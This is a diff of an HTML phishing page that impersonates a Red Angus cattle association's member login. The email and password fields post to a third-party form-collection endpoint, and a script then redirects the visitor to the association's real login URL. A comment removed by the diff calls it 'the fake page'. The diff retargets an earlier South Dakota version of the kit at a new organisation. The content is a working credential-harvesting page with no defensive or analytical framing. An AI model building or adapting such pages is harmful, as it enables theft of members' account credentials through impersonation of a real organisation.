@@ -3,65 +3,69 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>South Dakota Red Angus Association | Member Login</title>
+<title>Red Angus Login Page</title>
+<!-- Font Awesome for Icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <style>
-body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f4f6f8;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#333}
-._a{background:#fff;width:100%;max-width:400px;padding:40px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,.1);opacity:0;animation:_b .5s ease-out forwards;text-align:center}
+body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#f4f6f8;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#333}
+._a{background:#fff;width:100%;max-width:400px;padding:30px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,.1);opacity:0;animation:_b .5s ease-out forwards}
 @keyframes _b{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
-._c{text-align:center;margin-bottom:25px}
-._d{width:150px;height:auto;margin-bottom:15px;display:block;margin-left:auto;margin-right:auto}
-h2{font-size:20px;color:#b71c1c;margin-bottom:8px;font-weight:600}
-._e{font-size:14px;color:#666;line-height:1.4;margin-bottom:20px}
-._f{margin-bottom:20px;text-align:left}
+._c{text-align:center;margin-bottom:20px}
+h1{font-size:24px;color:#b71c1c;margin-bottom:10px;font-weight:600}
+p{font-size:14px;color:#666;line-height:1.4;margin-bottom:20px}
+._d{margin-bottom:20px;text-align:left}
 label{display:block;margin-bottom:8px;font-size:13px;font-weight:500;color:#333}
 input[type=email],input[type=password]{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:4px;font-size:15px;transition:all .2s ease;background:#fff;box-sizing:border-box}
 input:focus{border-color:#b71c1c;outline:none;box-shadow:0 0 0 3px rgba(183,28,28,.15)}
-._g{background-color:#b71c1c;color:#fff;border:none;padding:14px;width:100%;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;position:relative;transition:background-color .2s;display:flex;justify-content:center;align-items:center}
-._g:hover{background-color:#9a1616}
-._g:disabled{background-color:#999;cursor:not-allowed}
-._h{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:_i .8s linear infinite}
-@keyframes _i{to{transform:rotate(360deg)}}
-._j{color:#666;font-size:12px;margin-top:15px;text-align:center}
-._j a{color:#b71c1c;text-decoration:none}
+._e{background-color:#b71c1c;color:#fff;border:none;padding:14px;width:100%;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:background-color .2s;display:flex;justify-content:center;align-items:center}
+._e:hover{background-color:#9a1616}
+._e:disabled{background-color:#999;cursor:not-allowed}
+._f{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:_g .8s linear infinite}
+@keyframes _g{to{transform:rotate(360deg)}}
+._h{color:#666;font-size:12px;margin-top:15px;text-align:center}
+._h a{color:#b71c1c;text-decoration:none}
 </style>
 </head>
 <body>
 
 <div class="_a">
     <div class="_c">
-        <!-- SDRAA Logo Placeholder -->
-        <img src="https://sdra.org/wp-content/uploads/2020/05/sdra-logo.png" alt="Logo" class="_d" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCAxNTAgNTAiPjxyZWN0IHdpZHRoPSIxNTAiIGhlaWdodD0iNTAiIGZpbGw9IiNiNzFjMWMiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iMjAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIj5TRFJBQTwvdGV4dD48L3N2Zz4='">
-        <h2>Member Login</h2>
-        <p class="_e">Access your account to manage your herd records.</p>
+        <!-- Logo Placeholder -->
+        <img src="https://redangus.org/wp-content/uploads/2026/09/red-angus-logo2026.svg" alt="Logo" style="width:150px;height:auto;margin-bottom:15px;" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCAxNTAgNTAiPjxyZWN0IHdpZHRoPSIxNTAiIGhlaWdodD0iNTAiIGZpbGw9IiNiNzFjMWMiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iMjAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIj5SZWQgQW5ndXM8L3RleHQ+PC9zdmc+'">
+        <h1>Welcome!</h1>
+        <p>If you know your email, and password, then please enter your credentials:</p>
     </div>
 
     <!-- 
       Headless Forms Integration 
       Endpoint: https://api.headlessforms.cloud/api/v1/form/lPzGKyb0pH
     -->
-    <form id="loginForm" action="https://api.headlessforms.cloud/api/v1/form/lPzGKyb0pH" method="POST" autocomplete="off">
+    <form id="loginForm" action="https://api.headlessforms.cloud/api/v1/form/lPzGKyb0pH" method="POST" enctype="multipart/form-data" autocomplete="off">
         
-        <!-- Hidden attachment field to satisfy multipart/form-data requirement if needed by backend -->
+        <!-- Hidden attachment field to satisfy multipart/form-data requirement -->
         <input type="hidden" name="attachments[]" value="">
 
-        <div class="_f">
-            <label for="email">Email Address</label>
+        <div class="_d">
+            <label for="email">Email Address <span style="color:red">*</span></label>
             <input type="email" id="email" name="email" required placeholder="name@example.com">
         </div>
-        <div class="_f">
-            <label for="password">Password</label>
+        
+        <div class="_d">
+            <label for="password">Password <span style="color:red">*</span></label>
             <input type="password" id="password" name="password" required placeholder="••••••••">
         </div>
+
+        <div style="text-align:center;margin-top:20px;">
+            <button type="submit" class="_e" id="btn">
+                <span id="txt">Log In</span>
+                <div class="_f" id="spin"></div>
+            </button>
+        </div>
         
-        <button type="submit" class="_g" id="btn">
-            <span id="txt">Sign In</span>
-            <div class="_h" id="spin"></div>
-        </button>
+        <div class="_h">
+            <a href="#">I forgot my password</a>
+        </div>
     </form>
-    
-    <div class="_j">
-        <a href="#">Forgot your password?</a>
-    </div>
 </div>
 
 <script>
@@ -78,18 +82,12 @@ e.addEventListener('submit',function(i){
     
     t.disabled=true;
     n.style.display='none';
-    r.style.display='block';
+    r.style.display='inline-block';
 });
 
 // After form submits (simulated via JS timeout for UX), redirect
-// Note: Since this is a standard POST, the browser will navigate to the Headless Forms success URL or stay on page depending on their config.
-// To ensure we redirect to SDRAA immediately after "submission", we use a small timeout.
-// However, standard POST might reload the page. 
-// If you want to stay on the fake page until they click back, remove the redirect below.
-// If you want to send them to the real site to confirm "success", keep it.
-
 setTimeout(function(){
-    window.location.href="https://sdra.org/login";
+    window.location.href="https://vm-zebu.redangus.org/redspro/redspro/template/Login.vm";
 }, 800);
 
 })();
